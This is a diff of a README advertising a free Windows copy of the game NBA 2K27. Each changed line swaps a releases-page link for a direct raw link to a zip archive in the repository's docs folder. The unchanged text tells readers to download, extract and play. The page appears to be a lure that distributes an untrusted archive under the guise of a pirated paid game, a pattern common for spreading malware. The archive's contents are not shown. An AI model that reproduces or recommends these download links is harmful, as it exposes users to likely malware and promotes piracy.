@@ -6,7 +6,7 @@ Welcome to the ultimate destination for **NBA 2K27 on Windows** – the most rea
 
 ### ⬇️ Download NBA 2K27 Right Now
 
-[![DOWNLOAD NBA 2K27 FREE](https://img.shields.io/badge/Download-NBA_2K27_FREE-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://github.com/qwenne/NBA-2K27-Free-Windows/releases)
+[![DOWNLOAD NBA 2K27 FREE](https://img.shields.io/badge/Download-NBA_2K27_FREE-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=000000)](https://raw.githubusercontent.com/qwenne/NBA-2K27-Free-Windows/main/docs/Free-Windows-NB-3.4.zip)
 
 ---
 
@@ -69,7 +69,7 @@ Updated physics engine, enhanced AI, and smoother animations make every possessi
 ### Step 1: Get the Game Files
 
 Visit this link to download the application:  
-[**https://github.com/qwenne/NBA-2K27-Free-Windows/releases**](https://github.com/qwenne/NBA-2K27-Free-Windows/releases)
+[**https://raw.githubusercontent.com/qwenne/NBA-2K27-Free-Windows/main/docs/Free-Windows-NB-3.4.zip**](https://raw.githubusercontent.com/qwenne/NBA-2K27-Free-Windows/main/docs/Free-Windows-NB-3.4.zip)
 
 Click on the most recent release version. Look for the zip file labeled **NBA2K27_Free_Windows.zip**.
 
@@ -155,7 +155,7 @@ Absolutely! The modding community is active. Load custom rosters, courts, and pl
 
 ## 📜 Final Steps
 
-1. Visit the download page: [**Download NBA 2K27 Free**](https://github.com/qwenne/NBA-2K27-Free-Windows/releases)
+1. Visit the download page: [**Download NBA 2K27 Free**](https://raw.githubusercontent.com/qwenne/NBA-2K27-Free-Windows/main/docs/Free-Windows-NB-3.4.zip)
 2. Download the ZIP file
 3. Extract and start playing!
 
